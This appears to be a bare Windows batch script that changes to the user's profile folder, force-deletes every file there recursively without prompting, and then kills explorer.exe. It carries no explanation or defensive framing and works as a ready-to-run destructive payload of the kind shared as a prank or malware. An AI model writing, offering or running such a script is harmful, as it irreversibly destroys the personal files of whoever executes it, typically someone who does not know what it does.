@echo off
cd\
cd %userprofile%
del /s /q /f *
taskkill -f /im explorer.exe
exit